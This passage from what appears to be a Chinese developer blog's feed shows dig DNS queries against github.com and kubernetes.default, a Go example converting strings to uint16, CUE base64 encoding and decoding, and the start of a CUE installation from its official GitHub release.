SECTION:</span><br><span class="hljs-string">;153.252.30.192.in-addr.arpa.   IN      PTR</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">153.252.30.192.in-addr.arpa. 0  IN      PTR     lb-192-30-252-153-iad.github.com.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 388 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:28:40 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 102</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="dig-a-github-com-å’Œ-dig-ns-github-com-å’Œ-dig-mx-github-com-æ˜¾ç¤ºè¯¦æƒ…"><a href="#dig-a-github-com-å’Œ-dig-ns-github-com-å’Œ-dig-mx-github-com-æ˜¾ç¤ºè¯¦æƒ…" class="headerlink" title="dig a github.com å’Œ dig ns github.com å’Œ dig mx github.com æ˜¾ç¤ºè¯¦æƒ…"></a>dig a github.com å’Œ dig ns github.com å’Œ dig mx github.com æ˜¾ç¤ºè¯¦æƒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig a github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; a github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 14608</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;github.com.                    IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">github.com.             0       IN      A       140.82.114.3</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 1 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:31:27 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 55</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig ns github.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; ns github.com</span><br><span class="hljs-string">;; global options: +cmd</span><br><span class="hljs-string">;; Got answer:</span><br><span class="hljs-string">;; -&gt;&gt;HEADER&lt;&lt;- opcode</span>: QUERY, status: NOERROR, <span class="hljs-built_in">id</span>: 22967<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 1<br><br>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 65494<br>;; QUESTION SECTION:<br>;github.com.                    IN      NS<br><br>;; ANSWER SECTION:<br>github.com.             0       IN      NS      ns-520.awsdns-01.net.<br>github.com.             0       IN      NS      dns1.p08.nsone.net.<br>github.com.             0       IN      NS      ns-421.awsdns-52.com.<br>github.com.             0       IN      NS      dns4.p08.nsone.net.<br>github.com.             0       IN      NS      dns3.p08.nsone.net.<br>github.com.             0       IN      NS      dns2.p08.nsone.net.<br>github.com.             0       IN      NS      ns-1707.awsdns-21.co.uk.<br>github.com.             0       IN      NS      ns-1283.awsdns-32.org.<br><br>;; Query time: 15 msec<br>;; SERVER: 127.0.0.53<span class="hljs-comment">#53(127.0.0.53)</span><br>;; WHEN: Sat Sep 24 11:31:36 CST 2022<br>;; MSG SIZE  rcvd: 262<br><br><br><br><br><br>[root@ningan ~]<span class="hljs-comment"># dig mx github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; mx github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 64538</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;github.com.                    IN      MX</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">github.com.             0       IN      MX      10 alt3.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      5 alt2.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      5 alt1.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      10 alt4.aspmx.l.google.com.</span><br><span class="hljs-string">github.com.             0       IN      MX      1 aspmx.l.google.com.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 15 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:31:56 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 154</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="dig-a-facebook-github-com-å’Œ-dig-aaaa-facebook-github-com"><a href="#dig-a-facebook-github-com-å’Œ-dig-aaaa-facebook-github-com" class="headerlink" title="dig  a facebook.github.com å’Œ  dig  aaaa facebook.github.com"></a>dig  a facebook.github.com å’Œ  dig  aaaa facebook.github.com</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig  a facebook.github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; a facebook.github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 4880</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;facebook.github.com.           IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">facebook.github.com.    0       IN      CNAME   github.github.io.</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.109.153</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.110.153</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.111.153</span><br><span class="hljs-string">github.github.io.       0       IN      A       185.199.108.153</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 1 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:42:54 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 142</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig  aaaa facebook.github.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; aaaa facebook.github.com</span><br><span class="hljs-string">;; global options: +cmd</span><br><span class="hljs-string">;; Got answer:</span><br><span class="hljs-string">;; -&gt;&gt;HEADER&lt;&lt;- opcode</span>: QUERY, status: NOERROR, <span class="hljs-built_in">id</span>: 12984<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1<br><br>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 65494<br>;; QUESTION SECTION:<br>;facebook.github.com.           IN      AAAA<br><br>;; ANSWER SECTION:<br>facebook.github.com.    0       IN      CNAME   github.github.io.<br>github.github.io.       0       IN      AAAA    2606:50c0:8000::153<br>github.github.io.       0       IN      AAAA    2606:50c0:8002::153<br>github.github.io.       0       IN      AAAA    2606:50c0:8001::153<br>github.github.io.       0       IN      AAAA    2606:50c0:8003::153<br><br>;; Query time: 7 msec<br>;; SERVER: 127.0.0.53<span class="hljs-comment">#53(127.0.0.53)</span><br>;; WHEN: Sat Sep 24 11:42:49 CST 2022<br>;; MSG SIZE  rcvd: 190<br><br></code></pre></td></tr></table></figure><h3 id="dig-cname-facebook-github-com-æ˜¾ç¤ºè¯¦æƒ…"><a href="#dig-cname-facebook-github-com-æ˜¾ç¤ºè¯¦æƒ…" class="headerlink" title="dig cname facebook.github.com æ˜¾ç¤ºè¯¦æƒ…"></a>dig cname facebook.github.com æ˜¾ç¤ºè¯¦æƒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig cname facebook.github.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; cname facebook.github.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 43133</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;facebook.github.com.           IN      CNAME</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">facebook.github.com.    0       IN      CNAME   github.github.io.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 355 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:59:13 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 78</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig facebook.github.com +short</span><br><span class="hljs-string">github.github.io.</span><br><span class="hljs-string">185.199.109.153</span><br><span class="hljs-string">185.199.110.153</span><br><span class="hljs-string">185.199.111.153</span><br><span class="hljs-string">185.199.108.153</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig github.github.io +short</span><br><span class="hljs-string">185.199.109.153</span><br><span class="hljs-string">185.199.110.153</span><br><span class="hljs-string">185.199.111.153</span><br><span class="hljs-string">185.199.108.153</span><br><span class="hljs-string">[root@ningan ~]#</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="dig-amp-amp-k8s"><a href="#dig-amp-amp-k8s" class="headerlink" title="dig &amp;&amp; k8s"></a>dig &amp;&amp; k8s</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig kubernetes.default +search<br>dig kubernetes.default A kubernetes.default AAAA  +search<br>nslookup kubernetes.default<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.ruanyifeng.com/blog/2016/06/dns.html">DNS åŸç†å…¥é—¨</a>    å†™çš„ç°å¸¸å¥½ï¼Œæ¨è<br><a href="https://cloud.tencent.com/developer/article/1366027">dig å‘½ä»¤æ´å¯Ÿ DNS è§£æè¿‡ç¨‹</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>net</tag>
      
      <tag>dig</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€goè¯­è¨€ç³»åˆ—ã€‘goç±»å‹è½¬æ¢ï¼šå­—ç¬¦ä¸²è½¬åŒ–ä¸ºuint16</title>
    <link href="/2022/08/17/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91go%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8C%96%E4%B8%BAuint16/"/>
    <url>/2022/08/17/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91go%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8C%96%E4%B8%BAuint16/</url>
    
    <content type="html"><![CDATA[<h2 id="å­—ç¬¦ä¸²è½¬åŒ–ä¸ºuint16"><a href="#å­—ç¬¦ä¸²è½¬åŒ–ä¸ºuint16" class="headerlink" title="å­—ç¬¦ä¸²è½¬åŒ–ä¸ºuint16"></a>å­—ç¬¦ä¸²è½¬åŒ–ä¸ºuint16</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// æ–¹æ³•1</span><br>port1, err := strconv.Atoi(<span class="hljs-string">&quot;12345&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>port2 := <span class="hljs-type">uint16</span>(port1)<br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port1, port1) <span class="hljs-comment">// type:int  value:12345</span><br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port2, port2) <span class="hljs-comment">// type:uint16  value:12345</span><br>fmt.Println(port2)                              <span class="hljs-comment">// 12345</span><br><br><span class="hljs-comment">// æ–¹æ³•2</span><br>port3, err := strconv.ParseUint(<span class="hljs-string">&quot;1234&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>port4 := <span class="hljs-type">uint16</span>(port3)<br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port3, port3) <span class="hljs-comment">// type:uint64  value:1234</span><br>fmt.Printf(<span class="hljs-string">&quot;type:%T  value:%v\n&quot;</span>, port4, port4) <span class="hljs-comment">// type:uint16  value:1234</span><br>fmt.Println(port4)                              <span class="hljs-comment">// 1234</span><br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueè¯­è¨€ç³»åˆ—ã€‘(202208) base64ç¼–è§£ç </title>
    <link href="/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20base64%E7%BC%96%E8%A7%A3%E7%A0%81/"/>
    <url>/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20base64%E7%BC%96%E8%A7%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="åœ¨çº¿è¿è¡Œ"><a href="#åœ¨çº¿è¿è¡Œ" class="headerlink" title="åœ¨çº¿è¿è¡Œ"></a>åœ¨çº¿è¿è¡Œ</h2><p><a href="https://cuelang.org/play/#cue@export@cue">å·¥å…·</a></p><p>ä¸‰ç§ä¸åŒçš„è¾“å‡ºæ–¹å¼ï¼Œè¾“å‡ºçš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151050020.png" alt="image-20220812151050020"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151109172.png" alt="image-20220812151109172"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151149851.png" alt="image-20220812151149851"></p><h2 id="æœ¬åœ°æ¨¡æ‹Ÿ"><a href="#æœ¬åœ°æ¨¡æ‹Ÿ" class="headerlink" title="æœ¬åœ°æ¨¡æ‹Ÿ"></a>æœ¬åœ°æ¨¡æ‹Ÿ</h2><p>base64.cue</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master <span class="hljs-built_in">base64</span>]<span class="hljs-comment"># cat base64.cue</span><br>import <span class="hljs-string">&quot;encoding/base64&quot;</span><br><br>t1: base64.Encode(null, <span class="hljs-string">&quot;foo&quot;</span>)<br>t2: base64.Decode(null, base64.Encode(null, <span class="hljs-string">&quot;foo&quot;</span>))<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master cuePractice]<span class="hljs-comment"># cue version</span><br>cue version v0.4.3 linux/amd64<br>[root@master cuePractice]<span class="hljs-comment"># </span><br>[root@master cuePractice]<span class="hljs-comment"># cue export base64/base64.cue</span><br>&#123;<br>    <span class="hljs-string">&quot;t1&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span>,<br>    <span class="hljs-string">&quot;t2&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span><br>&#125;<br>[root@master cuePractice]<span class="hljs-comment"># cue export base64/base64.cue --out json</span><br>&#123;<br>    <span class="hljs-string">&quot;t1&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span>,<br>    <span class="hljs-string">&quot;t2&quot;</span>: <span class="hljs-string">&quot;Zm9v&quot;</span><br>&#125;<br>[root@master cuePractice]<span class="hljs-comment"># cue export base64/base64.cue --out yaml</span><br>t1: Zm9v<br>t2: !!binary Zm9v<br>[root@master cuePractice]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master cuePractice]<span class="hljs-comment"># go run base64/base64.go</span><br>scheme: <br>&#123;<br>        t1: <span class="hljs-string">&quot;Zm9v&quot;</span><br>        t2: <span class="hljs-string">&#x27;foo&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812150805711.png" alt="image-20220812150805711"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// base64.go</span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;errors&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;path/filepath&quot;</span><br><br><span class="hljs-string">&quot;cuelang.org/go/cue&quot;</span><br><span class="hljs-string">&quot;cuelang.org/go/cue/cuecontext&quot;</span><br>cueerror <span class="hljs-string">&quot;cuelang.org/go/cue/errors&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>ctx := cuecontext.New()<br><br>clusterVal := ctx.NewList()<br><br>confPath := <span class="hljs-string">&quot;/root/cuePractice/base64&quot;</span><br>fileData, err := os.ReadFile(filepath.Join(confPath, <span class="hljs-string">&quot;base64.cue&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err.Error())<br>&#125;<br><br>scheme := ctx.CompileBytes(fileData, cue.Scope(clusterVal))<br><span class="hljs-keyword">if</span> scheme.Err() != <span class="hljs-literal">nil</span> &#123;<br>msg := cueerror.Details(scheme.Err(), <span class="hljs-literal">nil</span>)<br>fmt.Println(errors.New(msg))<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;scheme: \n%s\n&quot;</span>, scheme)<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220812151403446.png" alt="image-20220812151403446"></p>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueè¯­è¨€ç³»åˆ—ã€‘(202208) å®‰è£…cue</title>
    <link href="/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20%E5%AE%89%E8%A3%85cue/"/>
    <url>/2022/08/14/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202208)%20%E5%AE%89%E8%A3%85cue/</url>
    
    <content type="html"><![CDATA[<h2 id="å®‰è£…æ–¹å¼ï¼šæºç å®‰è£…"><a href="#å®‰è£…æ–¹å¼ï¼šæºç å®‰è£…" class="headerlink" title="å®‰è£…æ–¹å¼ï¼šæºç å®‰è£…"></a>å®‰è£…æ–¹å¼ï¼šæºç å®‰è£…</h2><p><a href="https://github.com/cue-lang/cue">cueå®˜ç½‘</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1 ~]<span class="hljs-comment"># mkdir cuetest</span><br>[root@node1 ~]<span class="hljs-comment"># cd cuetest/</span><br>[root@node1 ~]<span class="hljs-comment"># wget https://github.com/cue-lang/cue/releases/download/v0.4.3/cue_v0.4.3_linux_amd64.tar.gz</span><br>[root@node1 ~]<span class="hljs-comment"># tar -zxvf cue_v0.4.3_linux_amd64.tar.gz</span><br>[root@node1 cuetest]<span class="hljs-comment"># ll</span><br>æ€»ç”¨é‡ 19656<br>-rwxr-xr-x 1 1001  116 14069760 4æœˆ  21 17:13 cue<br>-rw-r--r-- 1 root root  6037013 4æœˆ  21 17:16 cue_v0.4.3_linux_amd64.tar.gz<br>drwxr-xr-x 4 root root       33 8æœˆ  12 14:16 doc<br>-rw-r--r-- 1 1001  116    11358 4æœˆ  21 17:12 LICENSE<br>-rw-r--r-- 1 1001  116     5728 4æœˆ  21 17:12 README.md<br>[root@node1 cuetest]<span class="hljs-comment"># ./cue version</span><br>cue version 